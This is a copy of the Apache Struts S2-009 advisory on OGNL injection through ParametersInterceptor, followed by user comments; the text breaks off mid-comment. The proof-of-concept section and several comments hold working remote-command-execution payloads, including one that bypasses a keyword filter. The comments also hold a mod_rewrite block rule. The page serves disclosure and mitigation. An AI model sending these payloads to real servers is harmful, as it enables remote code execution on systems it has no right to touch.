+                                                                    </li></ol>
+
+
+                    </div>
+                
+                
+        <a href="#page-banner-end" class="assistive">跳到banner的尾部</a>
+<div id="page-banner-start" class="assistive"></div>
+
+                    
+            <div id="page-metadata-banner"><ul class="banner"><li id="system-content-items" class="noprint"><a href="" title="未限制" id="content-metadata-page-restrictions-hidden" class="hidden"></a></li><li class="page-metadata-item noprinthas-button" id="content-metadata-jira-wrapper"><a href="" title="" id="content-metadata-jira" class="aui-button aui-button-subtle content-metadata-jira tipsy-disabled hidden"><span>JIRA 链接</span></a></li></ul></div>
+            
+
+<a href="#page-banner-start" class="assistive">回到标题开始</a>
+<div id="page-banner-end" class="assistive"></div>
+    
+
+                <h1 id="title-text" class="with-breadcrumbs">
+                                                <a href="">S2-009</a>
+                                    </h1>
+            </div>
+        </div><!-- \#main-header -->
+        
+        
+
+        <div id="sidebar-container">
+                                                </div><!-- \#sidebar-container -->
+
+        
+    
+
+        
+
+
+
+
+            
+    
+
+                                
+    
+
+    
+    
+        
+    
+    
+                    
+    
+
+    
+
+    
+            
+        
+
+    
+    
+
+    
+            
+        
+
+
+
+    
+<div id="content" class="page view">
+    
+
+
+<div id="action-messages">
+                        </div>
+
+
+
+            <script type="text/x-template" title="searchResultsGrid">
+    <table class="aui">
+        <thead>
+            <tr class="header">
+                <th class="search-result-title">页面标题</th>
+                <th class="search-result-space">空间</th>
+                <th class="search-result-date">更新于</th>
+            </tr>
+        </thead>
+    </table>
+</script>
+<script type="text/x-template" title="searchResultsGridCount">
+    <p class="search-result-count">{0}</p>
+</script>
+<script type="text/x-template" title="searchResultsGridRow">
+    <tr class="search-result">
+        <td class="search-result-title"><a href="{1}" class="content-type-{2}"><span>{0}</span></a></td>
+        <td class="search-result-space"><a class="space" href="/confluence/display/{4}/" title="{3}">{3}</a></td>
+        <td class="search-result-date"><span class="date" title="{6}">{5}</span></td>
+    </tr>
+</script>
+        
+    
+            
+
+        
+                            
+    
+
+                    
+
+        
+        <a href="#page-metadata-end" class="assistive">转至元数据结尾</a>
+<div id="page-metadata-start" class="assistive"></div>
+
+    <div class="page-metadata">
+        <ul>
+            <li class="page-metadata-modification-info">
+                
+        
+    
+        
+    
+        
+            
+            由<span class='author'>     <a href="javascript:;" class="url fn">Maurizio Cucchiara</a></span>创建, 最后修改于<a class='last-modified' title='查看变更' href='javascript:;'>一月 20, 2012</a>
+                </li>
+        </ul>
+    </div>
+
+
+<a href="#page-metadata-start" class="assistive">转至元数据起始</a>
+<div id="page-metadata-end" class="assistive"></div>
+
+        
+                                            
+        <div id="main-content" class="wiki-content">
+                           
+        <h2 id="S2009-Summary">Summary</h2>
+
+<p>
+<p class="conf-macro output-inline" data-hasbody="true" data-macro-name="excerpt">ParameterInterceptor vulnerability allows remote command execution</p>
+
+<div class="table-wrap"><table class="confluenceTable"><tbody>
+<tr>
+<th class="confluenceTh"><p>Who should read this</p></th>
+<td class="confluenceTd"><p>All Struts 2 developers</p></td>
+</tr>
+<tr>
+<th class="confluenceTh"><p>Impact of vulnerability</p></th>
+<td class="confluenceTd"><p>Remote command execution</p></td>
+</tr>
+<tr>
+<th class="confluenceTh"><p>Maximum security rating</p></th>
+<td class="confluenceTd"><p>Critical</p></td>
+</tr>
+<tr>
+<th class="confluenceTh"><p>Recommendation</p></th>
+<td class="confluenceTd"><p>Developers should immediately upgrade to <a href="download.html#struts2312" class="external-link" rel="nofollow">Struts 2.3.1.2</a> or read the following solution instructions carefully for a configuration change to mitigate the vulnerability</p></td>
+</tr>
+<tr>
+<th class="confluenceTh"><p>Affected Software</p></th>
+<td class="confluenceTd"><p> Struts 2.0.0 - Struts 2.3.1.1 </p></td>
+</tr>
+<tr>
+<th class="confluenceTh"><p>Reporter</p></th>
+<td class="confluenceTd"><p> Meder Kydyraliev, Google Security Team </p></td>
+</tr>
+<tr>
+<th class="confluenceTh"><p>CVE Identifier</p></th>
+<td class="confluenceTd"><p><a href="javascript:;" class="external-link" rel="nofollow">CVE-2011-3923</a></p></td>
+</tr>
+<tr>
+<th class="confluenceTh"><p>Original Description</p></th>
+<td class="confluenceTd"><p> Reported directly to security@struts.a.o</p></td>
+</tr>
+</tbody></table></div>
+
+<h2 id="S2009-Problem">Problem</h2>
+
+<p>OGNL provides, among other features, extensive expression <a href="language-guide.html#Expression_Evaluation" class="external-link" rel="nofollow">evaluation capabilities</a>. The vulnerability allows a malicious user to bypass all the protections (regex pattern, deny method invocation) built into the ParametersInterceptor, thus being able to inject a malicious expression in any exposed string variable for further evaluation. </p>
+
+<p>A similar behavior was already addressed in <a href="s2-003.html">S2-003</a> and <a href="s2-005.html">S2-005</a>, but it turned out that the resulting fix based on whitelisting acceptable parameter names closed the vulnerability only partially. <br>
+Regular expression in ParametersInterceptor matches top['foo'](0) as a valid expression, which OGNL treats as (top['foo'])(0) and evaluates the value of 'foo' action parameter as an OGNL expression. This lets malicious users put arbitrary OGNL statements into any String variable exposed by an action and have it evaluated as an OGNL expression and since OGNL statement is in HTTP parameter value attacker can use blacklisted characters (e.g. #) to disable method execution and execute arbitrary methods, bypassing the ParametersInterceptor and OGNL library protections.</p>
+
+<h2 id="S2009-Proofofconcept">Proof of concept</h2>
+<div class="code panel pdl conf-macro output-block" style="border-width: 1px;" data-hasbody="true" data-macro-name="code"><div class="codeHeader panelHeader pdl" style="border-bottom-width: 1px;"><b>Vulnerable Action</b></div><div class="codeContent panelContent pdl">
+<pre class="syntaxhighlighter-pre" data-syntaxhighlighter-params="brush: java; gutter: false; theme: Default" data-theme="Default">
+public class FooAction {
+    private String foo;
+
+    public String execute() {
+        return &quot;success&quot;;
+    }
+    public String getFoo() {
+        return foo;
+    }
+
+    public void setFoo(String foo) {
+        this.foo = foo;
+    }
+}
+
+</pre>
+</div></div>
+
+<p>Here's an actual decoded example, which will create /tmp/PWNAGE directory:</p>
+
+<div class="preformatted panel conf-macro output-block" style="border-width: 1px;" data-hasbody="true" data-macro-name="noformat"><div class="preformattedContent panelContent">
+<pre>/action?foo=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('mkdir /tmp/PWNAGE'))(meh)&amp;z[(foo)('meh')]=true
+</pre>
+</div></div>
+
+<p>encoded version:</p>
+<div class="preformatted panel conf-macro output-block" style="border-width: 1px;" data-hasbody="true" data-macro-name="noformat"><div class="preformattedContent panelContent">
+<pre>/action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27mkdir%20/tmp/PWNAGE%27%29%29%28meh%29&amp;z[%28foo%29%28%27meh%27%29]=true
+</pre>
+</div></div>
+
+<p>And the JUnit version</p>
+<div class="code panel pdl conf-macro output-block" style="border-width: 1px;" data-hasbody="true" data-macro-name="code"><div class="codeHeader panelHeader pdl" style="border-bottom-width: 1px;"><b>PoC</b></div><div class="codeContent panelContent pdl">
+<pre class="syntaxhighlighter-pre" data-syntaxhighlighter-params="brush: java; gutter: false; theme: Default" data-theme="Default">
+public class FooActionTest extends org.apache.struts2.StrutsJUnit4TestCase&lt;FooAction&gt; {
+    @Test
+    public void testExecute() throws Exception {
+        request.setParameter(&quot;foo&quot;, &quot;(#context[\&quot;xwork.MethodAccessor.denyMethodExecution\&quot;]= new &quot; +
+                &quot;java.lang.Boolean(false), #_memberAccess[\&quot;allowStaticMethodAccess\&quot;]= new java.lang.Boolean(true), &quot; +
+                &quot;@java.lang.Runtime@getRuntime().exec('mkdir /tmp/PWNAGE'))(meh)&quot;);
+
+        request.setParameter(&quot;top['foo'](0)&quot;, &quot;true&quot;);
+
+        String res = this.executeAction(&quot;/example/foo.action&quot;);
+        FooAction action = this.getAction();
+
+        File pwn = new File(&quot;/tmp/PWNAGE&quot;);
+        Assert.assertFalse(&quot;Remote exploit: The PWN folder has been created&quot;, pwn.exists());
+    }
+}
+
+</pre>
+</div></div>
+
+<h2 id="S2009-Solution">Solution</h2>
+
+<p>The regex pattern inside the ParameterInterceptor was changed to provide a more narrow space of acceptable parameter names. <br>
+Furthermore the new setParameter method provided by the value stack will allow no more eval expression inside the param names.</p>
+
+
+<div class="confluence-information-macro confluence-information-macro-warning conf-macro output-block" data-hasbody="true" data-macro-name="warning"><span class="aui-icon aui-icon-small aui-iconfont-error confluence-information-macro-icon"> </span><div class="confluence-information-macro-body">
+<p><strong>It is strongly recommended to upgrade to <a href="download.html#struts2312" class="external-link" rel="nofollow">Struts 2.3.1.2</a>, which contains the corrected OGNL and XWork library.</strong></p></div></div>
+
+<p>In case an upgrade isn't possible in a particular environment, there is a configuration based mitigation workaround:</p>
+
+<h3 id="S2009-PossibleMitigationWorkaround:ConfigureParametersIntercptorinstruts.xmltoExcludeMaliciousParameters">Possible Mitigation Workaround: Configure ParametersIntercptor in struts.xml to Exclude Malicious Parameters</h3>
+
+<p>The following additional interceptor-ref configuration should mitigate the problem when applied correctly, allowing only simple navigational expression:</p>
+<div class="code panel pdl conf-macro output-block" style="border-width: 1px;" data-hasbody="true" data-macro-name="code"><div class="codeContent panelContent pdl">
+<pre class="syntaxhighlighter-pre" data-syntaxhighlighter-params="brush: java; gutter: false; theme: Default" data-theme="Default">
+&lt;interceptor-ref name=&quot;params&quot;&gt;
+	&lt;param name=&quot;acceptParamNames&quot;&gt;\w+((\.\w+)|(\[\d+\])|(\['\w+'\]))*&lt;/param&gt;
+&lt;/interceptor-ref&gt;
+</pre>
+</div></div>
+<div class="confluence-information-macro confluence-information-macro-note conf-macro output-block" data-hasbody="true" data-macro-name="note"><span class="aui-icon aui-icon-small aui-iconfont-warning confluence-information-macro-icon"> </span><div class="confluence-information-macro-body">
+<p>Beware that the above pattern breaks <a href="javascript:;" class="external-link" rel="nofollow">the type conversion support for collection and map</a> (those parameter names should be attached to acceptParamNames variable).<br>
+For this configuration to work correctly, it has to be applied to <strong>any params interceptor ref in any stack an application is using</strong>.<br>
+E.g., if an application is configured to use defaultStack as well as paramsPrepareParamsStack, you should copy both stack definitions from struts-default.xml to the application's struts.xml config file and apply the described excludeParams configuration for each params interceptor ref, that is <strong>once for defaultStack and twice for paramsPrepareParamsStack</strong></p></div></div>
+
+                
+        
+    
+        </div>
+
+                        
+    
+
+
+
+<div id="labels-section" class="pageSection group">
+    <div class="labels-section-content content-column" entityid="27836151" entitytype="page">
+	<div class="labels-content">
+		
+    <ul class="label-list label-list-right ">
+            <li class="no-labels-message">
+            无标签
+        </li>
+            </ul>
+
+    </div>
+</div>
+</div>
+        
+		
+            
+
+
+
+
+            
+        
+
+
+
+
+
+
+
+
+                        
+    
+<div id="comments-section" class="pageSection group">
+                <div class="section-header">
+            <h2 id="comments-section-title" class="section-title">
+                                    11 评论
+                            </h2>
+        </div>
+    
+    
+
+            <ol class="comment-threads top-level" id="page-comments">
+                    <li id="comment-thread-27836385" class="comment-thread">
+        <div class="comment  " id="comment-27836385">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: 匿名" title="匿名">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <span class="anonymous-user">匿名用户</span> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>Hotfix with Apache mod_rewrite </p>
+
+<div class="code panel pdl conf-macro output-block" style="border-width: 1px;" data-hasbody="true" data-macro-name="code"><div class="codeContent panelContent pdl">
+<pre class="syntaxhighlighter-pre" data-syntaxhighlighter-params="brush: java; gutter: false; theme: Default" data-theme="Default">
+RewriteEngine On
+RewriteCond %{QUERY_STRING} ^.*(getRuntime|allowStaticMethodAccess).* [NC]
+RewriteRule ^(.*)$ - [F,L]
+</pre>
+</div></div>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-27836385"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="一月 23, 2012 12:53" href="javascript:;"><span>一月 23, 2012</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-27836385"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+            <ol class="comment-threads">
+                                <li id="comment-thread-27837052" class="comment-thread">
+        <div class="comment  " id="comment-27837052">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: kxlzx" title="kxlzx">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <a href="javascript:;" class="url fn">kxlzx</a> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>悲剧啊！<br>
+I will ...<br>
+foo=(#context<a class="unresolved" href="#">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</a>=new java.lang.Boolean(false), #_memberAccess<a class="unresolved" href="#">&quot;allowStaticMethodAcc\u0065ss&quot;</a>=new java.lang.Boolean(true), @java.lang.Runtime@getRuntim\u0065().exec('calc'))(meh)&amp;top<a class="unresolved" href="#">'foo'</a>(0)=false<br>
+no getRuntime and no allowStaticMethodAccess.</p>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-27837052"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="二月 01, 2012 07:56" href="javascript:;"><span>二月 01, 2012</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-27837052"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+    </li>
+                        </ol>
+    </li>
+                    <li id="comment-thread-27837291" class="comment-thread">
+        <div class="comment  " id="comment-27837291">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: 匿名" title="匿名">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <span class="anonymous-user">匿名用户</span> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <div class="conf-macro output-block" data-hasbody="true" data-macro-name="unmigrated-wiki-markup"><p>Hello</p>
+
+<p>in short:<br>
+In our opinion, the fix from Maurizio Cucchiara is sufficient for the struts default-stack, but custom interceptors can easily (and accidentally) circumvent the fix and leaving the application vulnerable.</p>
+
+<p>The problem:<br>
+we have tested the fix in struts 2.3.1.2 which was done by Maurizio Cucchiara with our application.<br>
+Surprisingly it was not working in our setup. The reason is, that the changes made at ParametersInterceptor, OgnlValueStack, OgnlUtil and so on do not prevent the dangerous parameter value to be written into the ValueStack (OgnlValueStack).<br>
+If the application reads the ValueStack with valueStack.findValue(aKey), the parameter value is evaluated by OGNL and the bogus code becomes executed!</p>
+
+<p>For instance: When an interceptor (or other application code) is simply reading the ValueStack like for debugging purposes, then an attack will succeed!<br>
+Here a code snippet from our custom interceptor</p>
+
+<p>public String intercept (ActionInvocation invocation)<br>
+        throws Exception<br>
+{<br>
+    ActionContext ac = invocation.getInvocationContext();<br>
+    ValueStack valueStack = ac.getValueStack();<br>
+    Map&lt;String, Object&gt; parameters = ac.getParameters();<br>
+    Iterator&lt;Entry&lt;String, Object&gt;&gt; it = parameters.entrySet().iterator();<br>
+    Entry&lt;String, Object&gt; entry = null;<br>
+    String value = null;</p>
+
+<p>    for (; it.hasNext()<img class="emoticon" src="static/picture/wink.png" height="16" width="16" align="absmiddle" alt="" border="0"></p>
+    <div class="error"><span class="error">Unknown macro: {        entry = it.next();        value = (String) valueStack.findValue(entry.getKey()); // &lt;== OGNL-Expression becomes evaluated!                        if (logDebug)            logger.debug(&quot;ValueStack [key / value]}</span> </div>
+<p>}</p>
+
+<p>The value from the OGNLValueStack in a attack scenario like the above mentioned would look like this:<br>
+<span class="error">[...]</span> ValueStack <span class="error">[key / value]</span>: [myParameter / (#context<span class="error">[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]</span>= new java.lang.Boolean(false), #_memberAccess<span class="error">[&quot;allowStaticMethodAccess&quot;]</span>= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('notepad'))(meh)]<br>
+(Here the Windows Notepad Application gets startet)</p>
+
+<p>Suggestion:<br>
+In OgnlUtil.setValue(String name, Map&lt;String, Object&gt; context, Object root, Object value, boolean evalName) the parameterName name is checked to be a value expression (isEvalExpression(...)).<br>
+Why not check the parameter value too and throw the OgnlException in case it is a value expression?</p>
+
+<p>We would appreciate any suggestions to solve the problem. <br>
+Of course the best would be another improvement of the struts2-ognl-integration <img class="emoticon" src="static/picture/smile.png" height="16" width="16" align="absmiddle" alt="" border="0"></p>
+
+<p>Thanks in advance<br>
+Marcus Zander, Germany</p></div>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-27837291"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="二月 03, 2012 09:43" href="javascript:;"><span>二月 03, 2012</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-27837291"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+            <ol class="comment-threads">
+                                <li id="comment-thread-27840186" class="comment-thread">
+        <div class="comment  " id="comment-27840186">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: 匿名" title="匿名">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <span class="anonymous-user">匿名用户</span> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>Hi Marcus,</p>
+
+<p>I am not able to reprodue this issue , following are my jar versions -<br>
+struts2-core-2.0.12.jar<br>
+xwork-2.0.4.jar<br>
+ognl-2.6.11.jar</p>
+
+<p>Also I tried adding a cusom interceptor and reading the values , still the expression is not get evaluated.</p>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-27840186"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="三月 05, 2012 19:19" href="javascript:;"><span>三月 05, 2012</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-27840186"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+            <ol class="comment-threads">
+                                <li id="comment-thread-27845698" class="comment-thread">
+        <div class="comment  " id="comment-27845698">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: 匿名" title="匿名">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <span class="anonymous-user">匿名用户</span> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>Hi</p>
+
+<p>I could reproduce the issue with struts2-core-2.0.11.jar &amp; xwork-2.0.4.jar</p>
+
+<p>http://host:port//context/someAction.do?('\u0023_memberAccess<a class="unresolved" href="#">\'allowStaticMethodAccess\'</a>')(meh)=true&amp;(aaa)(('\u0023context<a class="unresolved" href="#">\'xwork.MethodAccessor.denyMethodExecution\'</a>\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</p>
+
+<p>Regards<br>
+Agilan Palani</p>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-27845698"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="五月 03, 2012 12:18" href="javascript:;"><span>五月 03, 2012</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-27845698"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+    </li>
+                        </ol>
+    </li>
+                        </ol>
+    </li>
+                    <li id="comment-thread-27851025" class="comment-thread">
+        <div class="comment  " id="comment-27851025">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: 匿名" title="匿名">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <span class="anonymous-user">匿名用户</span> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>Hi,<br>
+Tried the workaround and I'm seeing this in my app server log:<br>
+<a class="unresolved" href="#">20:48:582 EDT</a> 0000004b OgnlUtil      W com.opensymphony.xwork2.util.OgnlUtil internalSetProperty Caught OgnlException while setting property 'acceptParamNames' on type 'com.opensymphony.xwork2.interceptor.ParametersInterceptor'.<br>
+                                 ognl.NoSuchPropertyException: com.opensymphony.xwork2.interceptor.ParametersInterceptor.acceptParamNames<br>
+        at ognl.ObjectPropertyAccessor.setProperty(ObjectPropertyAccessor.java:132)</p>
+
+<p>I'm using struts 2.0.14 and xwork 2.0.7.  Overrode the entire default stack in my default package as such:</p>
+
+<p>		&lt;interceptors&gt;<br>
+			&lt;interceptor-stack name=&quot;defaultStack&quot;&gt;<br>
+				&lt;interceptor-ref name=&quot;exception&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;alias&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;servletConfig&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;prepare&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;i18n&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;chain&quot;/&gt;<br>
+				&lt;!-- &lt;interceptor-ref name=&quot;debugging&quot;/&gt; --&gt;<br>
+				&lt;interceptor-ref name=&quot;profiling&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;scopedModelDriven&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;modelDriven&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;fileUpload&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;checkbox&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;staticParams&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;params&quot;&gt;<br>
+					&lt;param name=&quot;excludeParams&quot;&gt;dojo\..*&lt;/param&gt;<br>
+					&lt;param name=&quot;acceptParamNames&quot;&gt;\w+((\.\w+)|([\d+])|(['\w+']))*&lt;/param&gt;<br>
+				&lt;/interceptor-ref&gt;<br>
+				&lt;interceptor-ref name=&quot;conversionError&quot;/&gt;<br>
+				&lt;interceptor-ref name=&quot;validation&quot;&gt;<br>
+					&lt;param name=&quot;excludeMethods&quot;&gt;input,back,cancel,browse&lt;/param&gt;<br>
+				&lt;/interceptor-ref&gt;<br>
+				&lt;interceptor-ref name=&quot;workflow&quot;&gt;<br>
+					&lt;param name=&quot;excludeMethods&quot;&gt;input,back,cancel,browse&lt;/param&gt;<br>
+				&lt;/interceptor-ref&gt;<br>
+				&lt;/interceptor-stack&gt;<br>
+		&lt;/interceptors&gt;	</p>
+
+<p>		&lt;default-interceptor-ref name=&quot;defaultStack&quot;/&gt;</p>
+
+<p>Why is acceptParamNames not being recognized as a property for the ParameterInterceptor?</p>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-27851025"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="六月 29, 2012 15:57" href="javascript:;"><span>六月 29, 2012</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-27851025"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+            <ol class="comment-threads">
+                                <li id="comment-thread-27851026" class="comment-thread">
+        <div class="comment  " id="comment-27851026">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: 匿名" title="匿名">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <span class="anonymous-user">匿名用户</span> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>Just checked and am actually using xwork 2.0.4.  According to source seems like this version does not accept params?</p>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-27851026"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="六月 29, 2012 16:31" href="javascript:;"><span>六月 29, 2012</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-27851026"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+            <ol class="comment-threads">
+                                <li id="comment-thread-27851138" class="comment-thread">
+        <div class="comment  " id="comment-27851138">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: lukaszlenart" title="lukaszlenart">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <a href="~lukaszlenart.html" class="url fn">Lukasz Lenart</a> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>Probably you are right <img class="emoticon emoticon-smile" src="static/picture/smile.svg" data-emoticon-name="smile" alt="(微笑)"></p>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-27851138"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="七月 02, 2012 01:54" href="javascript:;"><span>七月 02, 2012</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-27851138"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+    </li>
+                        </ol>
+    </li>
+                        </ol>
+    </li>
+                    <li id="comment-thread-30759474" class="comment-thread">
+        <div class="comment  " id="comment-30759474">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: rmn190" title="rmn190">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <a href="javascript:;" class="url fn">rmn190</a> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>with following http package, </p>
+
+<p>GET /struts2-showcase-2.0.6/validation/submitFieldValidatorsExamples.action;jsessionid=94F890877E7F79CFF505D3166F099E56?requiredValidatorField=(%23context<a class="unresolved" href="#">'xwork.MethodAccessor.denyMethodExecution'</a>=false,%23_memberAccess<a class="unresolved" href="#">'allowStaticMethodAccess'</a>=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23rep=@org.apache.struts2.ServletActionContext@getResponse(),%23webStr=new%20byte<a class="unresolved" href="#">51020</a>,%23rep.getWriter().println(new%20java.lang.StringBuilder(%22tfavodrisy%22).append(%22~<sub>not_exist_in_html</sub><sub>%22).append(%23req.getRealPath(%22%2F%22)).append(%22~3.1415621</sub>%22).toString()))(iydx)&amp;z<a class="unresolved" href="#">%28requiredValidatorField%29%28%27iydx%27%29</a>=true HTTP/1.1<br>
+Accept-Encoding: identity<br>
+Host: darksalmon.net<br>
+Connection: close<br>
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)</p>
+
+<p>it failed, and struts version is 2.0.6, but when I tested it with 2.3.1.1, it worked well, so would you give some point about the reason why it failed? </p>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-30759474"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="三月 26, 2013 05:33" href="javascript:;"><span>三月 26, 2013</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-30759474"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+            <ol class="comment-threads">
+                                <li id="comment-thread-30759477" class="comment-thread">
+        <div class="comment  " id="comment-30759477">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: lukaszlenart" title="lukaszlenart">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <a href="~lukaszlenart.html" class="url fn">Lukasz Lenart</a> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>code changes? 2.0.6 is very old and this attack was prepared against 2.3.x, 2.0.x has some other vulnerabilities <img class="emoticon emoticon-wink" src="static/picture/wink.svg" data-emoticon-name="wink" alt="(眨眼)"></p>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-30759477"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
